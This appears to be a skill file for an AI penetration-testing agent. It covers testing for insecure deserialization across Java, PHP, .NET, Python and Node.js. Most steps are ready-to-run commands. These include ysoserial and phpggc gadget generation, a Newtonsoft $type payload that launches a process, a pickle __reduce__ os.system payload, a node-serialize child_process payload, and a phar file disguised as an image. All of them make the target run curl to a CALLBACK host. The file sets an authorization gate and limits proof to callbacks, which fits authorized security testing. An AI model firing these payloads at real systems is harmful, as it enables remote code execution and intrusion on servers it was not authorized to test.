---
name: harness-deserialization
description: "Test insecure deserialization in Java, PHP, .NET, Python, Ruby, and Node.js with gadget chain identification, controlled RCE, and OOB confirmation."
---

# Deserialization deep — gadget chains, controlled RCE

Source: `testing-deserialization`, `ysoserial`, `phpggc`, `peas` (2024: Java 17+ bypass via JNDI, PHP phar:// in file ops, .NET TypeNameHandling, Node.js node-serialize, Python pickle).

## Gate

Approved `host+endpoint+injection point` only. Every command via `cyber_process` `argv`. One gadget per attempt. Execution proof = OOB callback only (DNS/HTTP). No destructive payload (no `rm`, no file write to system dirs). → `harness-vuln-triage` before `cyber_finding`.

## Steps

### 1. Fingerprint the stack

```
cyber_process argv=["curl","-sS","-D","-","<url>/"]
```

Record cookies, server headers, path extensions. Match against:

| Signal | Stack |
|---|---|
| `JSESSIONID`, `.jsp`/`.do` | Java |
| `PHPSESSID`, `.php` | PHP |
| `ASP.NET_SessionId`, `.aspx`, `__VIEWSTATE` | .NET |
| `connect.sid`, `X-Powered-By: Express` | Node.js |
| `csrftoken` + `X-Frame-Options` Django-style | Python |
| `_session_id` + `X-Request-Id` Rails-style | Ruby |

### 2. Locate the injection point

Look for serialized data in cookies, hidden fields, POST bodies, custom headers:

```
cyber_process argv=["curl","-sS","-D","-","-H","Cookie: <session>","<url>/api/endpoint"]
```

Decode the suspect value and check format signatures:

| Format | Signature (first bytes) |
|---|---|
| Java ObjectInputStream | `aced 0005` (hex) or `rO0AB` (Base64) |
| PHP serialize | `O:4:"User":2:{s:4:"name"` |
| .NET BinaryFormatter | `AAEAAAD/////` (Base64) |
| .NET Newtonsoft JSON | `{"$type":"System.` |
| Python pickle | `\x80\x03` / `\x80\x04` / `\x80\x05` |
| Ruby Marshal | `\x04\x08` |
| Node.js node-serialize | `{"rce":"_$$ND_FUNC$$_` |
| YAML | `!!python/object/apply:` |

### 3. Positive control — legitimate object

Send a well-formed, benign serialized object to confirm the endpoint processes it:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","-H","Cookie: <session>","--data-binary","@legitimate-object.bin","<url>/api/endpoint"]
```

Record status, body, behavior. This is the functional baseline — the endpoint must accept and process the object normally.

### 4. Gadget generation and delivery — Java

Generate payload:

```
cyber_process argv=["java","-jar","ysoserial.jar","CommonsCollections1","curl https://CALLBACK/java-CC1-UNIQUE"]
```

Encode and deliver to the injection point:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","-H","Cookie: <session>","--data-binary","@payload-cc1.bin","<url>/api/endpoint"]
```

If no callback → try other chains. Check error messages for classpath hints:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-java-serialized-object","--data-binary","@payload-cb1.bin","<url>/api/endpoint"]
```

Chains to try in order: CommonsCollections1-7, CommonsBeanutils1, Spring1-2, Hibernate1, JRMPClient.

### 5. Gadget generation and delivery — PHP

```
cyber_process argv=["phpggc","Laravel/RCE1","system","curl https://CALLBACK/php-laravel-UNIQUE","-b"]
```

Deliver via POST body or phar:// trigger:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/x-php-serialized","-d","<base64-payload>","<url>/api/endpoint"]
```

For phar:// trigger (requires file upload vector): upload a `.phar` disguised as an image, then trigger via a file operation that accepts `phar://`:

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-F","file=@payload.phar;filename=avatar.jpg","<url>/api/upload"]
cyber_process argv=["curl","-sS","-D","-","<url>/api/file?path=phar://uploads/avatar.jpg/test"]
```

### 6. Gadget generation and delivery — .NET / Python / Node.js

**.NET BinaryFormatter:**

```
cyber_process argv=["ysoserial.exe","-f","BinaryFormatter","-g","TypeConfuseDelegate","-c","curl https://CALLBACK/dotnet-UNIQUE"]
```

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/octet-stream","--data-binary","@dotnet-payload.bin","<url>/api/endpoint"]
```

**.NET Newtonsoft JSON (TypeNameHandling):**

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"$type\":\"System.Windows.Data.ObjectDataProvider, PresentationFramework\",\"MethodName\":\"Start\",\"ObjectInstance\":{\"$type\":\"System.Diagnostics.Process, System\",\"StartInfo\":{\"FileName\":\"curl\",\"Arguments\":\"https://CALLBACK/dotnet-json-UNIQUE\"}}}","<url>/api/endpoint"]
```

**Python pickle:**

```
cyber_process argv=["python3","-c","import pickle,base64,os;exec('class R:\\n def __reduce__(self):\\n  return(os.system,(\"curl https://CALLBACK/py-UNIQUE\",))');print(base64.b64encode(pickle.dumps(R())).decode())"]
```

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/octet-stream","--data-binary","@pickle-payload.bin","<url>/api/endpoint"]
```

**Node.js node-serialize:**

```
cyber_process argv=["curl","-sS","-D","-","-X","POST","-H","Content-Type: application/json","-d","{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://CALLBACK/node-UNIQUE')}()\"}","<url>/api/endpoint"]
```

### 7. Blind deserialization — time and DNS

If no OOB callback infrastructure, use timing:

```
cyber_process argv=["curl","-sS","-o","/dev/null","-w","time:%{time_total}","-X","POST","--data-binary","@sleep-gadget.bin","<url>/api/endpoint"]
```

Three samples: if `time_total` > 5s consistently when using `Thread.sleep(5000)` gadget vs < 1s for benign object → time-based confirmation.

For DNS-only callback:

```
cyber_process argv=["java","-jar","ysoserial.jar","URLDNS","https://UNIQUE-ID.CALLBACK-DOMAIN"]
```

URLDNS requires no classpath dependency — if DNS callback received, deserialization is confirmed (but not RCE).

### 8. Negative controls

| Control | Payload | Expected |
|---|---|---|
| Legitimate object | well-formed, no gadget | processed normally |
| Malformed data | truncated or corrupted bytes | error, no execution |
| Wrong classpath chain | CommonsCollections on target without commons-collections | error, no callback |
| Well-formed object, no gadget trigger | valid User object without exploit chain | no callback |

### Stop

Destructive payloads (`rm`, file write to system dirs), more than one gadget per attempt, chaining beyond OOB confirmation.

### Evidence ids

Keep stack-fingerprint, injection-point-location, positive-control, each gadget delivery (with chain name + UNIQUE callback id), timing samples (3), URLDNS probe, and all 4 controls as separate observations.

## Verification scenarios

| Scenario | Observation | Expected classification |
|---|---|---|
| CommonsCollections1 → HTTP callback received | CALLBACK log shows java-CC1-UNIQUE | Java deserialization RCE candidate |
| CommonsCollections1 → no callback, error mentions missing class | stack trace with ClassNotFoundException | wrong chain, try next |
| URLDNS → DNS callback received | DNS log for UNIQUE-ID | deserialization confirmed (not RCE) |
| phpggc Laravel/RCE1 → HTTP callback | CALLBACK log | PHP deserialization RCE candidate |
| phar:// trigger → HTTP callback after file upload + path traversal | CALLBACK log | phar deserialization candidate |
| Newtonsoft JSON $type → HTTP callback | CALLBACK log | .NET TypeNameHandling RCE candidate |
| pickle → HTTP callback | CALLBACK log | Python pickle RCE candidate |
| node-serialize → HTTP callback | CALLBACK log | Node.js deserialization RCE candidate |
| Sleep gadget → 5s delay, 3 samples | consistent time_total > 5s | time-based blind deserialization |
| Benign object → no callback | normal processing | negative control confirmed |

A deserialization error is a lead. The finding is the OOB callback or consistent timing anomaly.

## Done

`cyber_finding` cites the format, the gadget chain name, the library/classpath, the OOB proof (callback ID or timing), and all 4 controls. URLDNS alone proves deserialization but not RCE — classify accordingly. Untested stacks stay `not-tested`.
